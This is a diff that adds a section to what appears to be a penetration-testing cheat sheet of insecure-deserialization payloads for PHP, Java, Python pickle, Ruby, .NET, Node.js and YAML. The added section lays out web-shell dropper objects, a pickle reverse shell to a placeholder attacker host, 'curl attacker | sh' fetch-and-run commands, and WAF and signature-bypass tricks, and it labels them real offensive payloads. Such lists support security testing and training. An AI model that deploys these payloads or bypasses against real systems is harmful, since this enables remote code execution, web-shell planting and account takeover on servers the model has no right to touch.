@@ -1712,6 +1712,245 @@ Embed serialized object in session or JWT cookie.
 // Encoded session cookie
 O:8:"Exploit":1:{s:4:"role";s:5:"admin";}
 ```
+# **✅ Insecure Deserialization – Complete Test Case (with Bypass Cases)**
+
+1 Remote Code Execution via Object Deserialization
+
+2 Arbitrary Object Injection
+
+3 ClassLoader Instantiation Abuse
+
+4 Magic Method Exploitation (__wakeup / __destruct / __toString)
+
+5 PHP Serialization Attack (PHP Object Injection)
+
+6 Java Deserialization (Commons-Collections Gadget)
+
+7 Python Pickle RCE
+
+8 .NET BinaryFormatter RCE
+
+9 Node.js Serialized Payload Injection
+
+10 Bypass of Integrity Checks (HMAC, MAC, Signing)
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal structured payload list)*
+
+```
+2.1 PHP Serialized Object Injection
+O:8:"Example":1:{s:4:"cmd";s:2:"id";}
+```
+
+```
+2.2 Java Serialized Object (Commons Collections)
+(ac ed 00 05 ... binary payload ...)
+```
+
+```
+2.3 Python Pickle Malicious Payload
+cos
+system
+(S'id')
+```
+
+```
+2.4 Node.js Serialized Object Attack
+{"rce":{"__proto__":{"exec":"node -e '...'"} }}
+```
+
+```
+2.5 Ruby Marshal RCE
+"\x04\bo:@ExploitClass\t:\n@commandI\"id"
+```
+
+```
+2.6 Signed Serialization Token Tampering
+{"token":"base64(serialized_object)"}
+```
+
+```
+2.7 Tampering Serialized Cookies
+Set-Cookie: session=serialized_data_here
+```
+
+```
+2.8 JavaScript Object Deserialization (Unsafe JSON.parse)
+{"__proto__":{"isAdmin":true}}
+```
+
+```
+2.9 Config File Deserialization Attack
+settings=base64(serialized_object)
+```
+
+```
+2.10 Unsafe BinaryFormatter (.NET) Payload
+(binary stream containing prebuilt gadget)
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Offensive Payloads)**
+
+*(Real attack payloads used in ransomware, shell drops, and privilege escalation)*
+
+```
+3.1 PHP POP Chain → RCE
+O:8:"Exploit":2:{s:4:"file";s:12:"/tmp/shell";s:4:"code";s:13:"<?php eval($_GET['x']);?>";}
+```
+
+```
+3.2 PHP __destruct File Write → Web Shell Dropper
+O:6:"Logger":1:{s:4:"log";s:40:"<?php system($_GET['cmd']); ?>";}
+```
+
+```
+3.3 Java Commons-Collections 7 RCE Gadget
+(base64 Gadgets)
+rO0ABXNyABF...
+```
+
+```
+3.4 Python Pickle Reverse Shell
+cos
+system
+(S"bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
+tR.
+```
+
+```
+3.5 Ruby Marshal Payload (Metasploit)
+\x04\bo:@Exploit\x06:\f@payloadI\"curl attacker/pwn|sh"
+```
+
+```
+3.6 .NET BinaryFormatter RCE Gadget (ysoserial.net)
+AAEAAAD/////AQAAAAAAAAAEAQAAAC...
+```
+
+```
+3.7 Node.js Express-session Poisoning
+{"cookie":{"originalMaxAge":null,"expires":"-1"},"__proto__":{"outputFunction":"require('child_process').exec('curl http://attacker/p.sh | sh')"}}
+```
+
+```
+3.8 YAML Deserialization → RCE
+!!python/object/apply:os.system ["id"]
+```
+
+```
+3.9 Perl Storable Deserialize Command Execution
+$VAR1 = bless( { cmd => 'id' }, 'Exploit' );
+```
+
+```
+3.10 Golang gob Decoder Exploit
+(binary gob-encoded payload crafted to instantiate interfaces)
+```
+
+---
+
+# **4. Bypass Techniques (WAF, Signing, Filters, Validators)**
+
+*(Same style as previous attack formats)*
+
+```
+4.1 Base64 Double Encoding
+base64(base64(serialized payload))
+```
+
+```
+4.2 JSON Wrapping Bypass
+{"data":"serialized_here"}
+```
+
+```
+4.3 Magic-Bytes Obfuscation
+\x00\x01\x02O:3:"ABC":1:{...}
+```
+
+```
+4.4 Signature Stripping (Weak HMAC)
+token = base64(payload) + "." + weak_signature
+```
+
+```
+4.5 PHP Serialization Splitting
+O:3:"A":1:{s:1:"x";s:3:"abc";}
+O:+1:"B":1:{s:1:"x";s:3:"cmd";}
+```
+
+```
+4.6 Whitespace / Newline Injection
+O:6:"Class":
+1
+:{
+...
+}
+```
+
+```
+4.7 Unicode Obfuscation
+O\u003a6\u003a\"Class\"...
+```
+
+```
+4.8 Chunked Transfer Encoding (WAF Bypass)
+Transfer-Encoding: chunked
+(serialized payload split into chunks)
+```
+
+```
+4.9 Cookie Prefix Bypass
+__Host-session -> session
+```
+
+```
+4.10 Compression Bypass (gzip/base64)
+H4sIAAAAA (GZIPed payload)
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World Exploitation)**
+
+```
+5.1 Insecure Deserialization → Remote Code Execution
+Upload serialized object → triggers magic methods → executes system("id")
+```
+
+```
+5.2 Signed Token Bypass → Account Takeover
+Manipulate HMAC-signed session → user=admin
+```
+
+```
+5.3 Python Pickle in ML API → Server Takeover
+{"model": base64(pickle_rce_payload)}
+```
+
+```
+5.4 Java Deserialization → JNDI → LDAP RCE
+Serialized object calls remote lookup → loads attacker class
+```
+
+```
+5.5 Node.js Deserialization → Prototype Pollution → Eval RCE
+{"__proto__":{"outputFunction":"require('child_process').exec('id')"}}
+```
+
+```
+5.6 Ruby Marshal → RCE on Rails apps
+session=Marshal.dump(exploit_object)
+```
+
+```
+5.7 YAML → RCE Chain
+!!python/object/new:subprocess.Popen ["curl attacker | sh"]
+```
 
 ## POP Gadgets
 
